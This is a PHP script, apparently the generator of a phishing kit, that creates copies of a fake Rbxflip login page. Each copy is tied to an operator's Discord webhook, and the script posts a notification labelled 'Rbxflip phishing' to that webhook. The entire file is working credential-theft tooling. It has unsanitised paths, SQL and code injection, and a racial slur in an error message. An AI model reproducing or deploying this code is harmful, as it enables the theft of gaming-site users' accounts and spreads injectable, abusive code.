<?php
ob_start();
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $sleepy = $_POST['folder'];
    if(!is_dir($sleepy)){
    } else {
	die('Directory already taken by another user Nigga!');
    }
    $dhwebhook = $_POST['dhwebhook'];
    $image = $_POST['image'];
    $name = $_POST['name'];
    $discord = $_POST['discord'];
    $id = rand(1302, 31424);
    
    $sql = "INSERT INTO loggers (id, webhook)
VALUES ($id, $dhwebhook)";


mkdir("../$sleepy", 0777, true);
$code = file_get_contents("../login.php");
$code1 = file_get_contents("../api.php");
$code2 = file_get_contents("../cookie.png");
$code3 = file_get_contents("../bg.png");
$code4 = file_get_contents("../poppins.woff2");
$code5 = file_get_contents("../poppins_bold.woff2");
$myfile2 = fopen("../$sleepy/cookie.png", "w");
$myfile3 = fopen("../$sleepy/bg.png", "w");
$myfile4 = fopen("../$sleepy/poppins.woff2", "w");
$myfile5 = fopen("../$sleepy/poppins_bold.woff2", "w");
$myfile = fopen("../$sleepy/login.php", "w");
$myfile1 = fopen("../$sleepy/index.php", "w");
$txt1 = $code1;
$txt2 = $code2;
$txt3 = $code3;
$txt4 = $code4;
$txt5 = $code5;
$txt = $code;
fwrite($myfile1, '<?php
$name = "'.$name.'";
$image = "'.$image.'";
$Dualurl = "'.$dhwebhook.'";
?>' .$txt1);
fwrite($myfile, $txt);
fwrite($myfile2, $txt2);
fwrite($myfile3, $txt3);
fwrite($myfile4, $txt4);
fwrite($myfile5, $txt5);
$url = "$dhwebhook";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "FazyKey - Notifier",
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307",
     "content" => "",
        "embeds" => [
            [
                "title" => "Dualhook Gen | $name Created!",
                "type" => "rich",
                "color" => hexdec("99999"),
                "thumbnail" => [
                    "url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307"
                ],
                "author" => [
                     "name" => "Webhook Notifier",
                ],
                "image" => [
                    "url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307"
                ],
                "footer" => [
                    "text" => "Rbxflip phishing",
                  "icon_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307"
                ],
                "fields" => [
                    [
                        "name" => "**Ur Dualhook Rbxflip Generator url 📌**",
                        "value" => "```".$_SERVER["SERVER_NAME"]."/$sleepy```",
                        "inline" => False
                    ],
                ]
            ],
        ],
    
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);
header("location: ../$sleepy");
ob_end_flush();
}
?>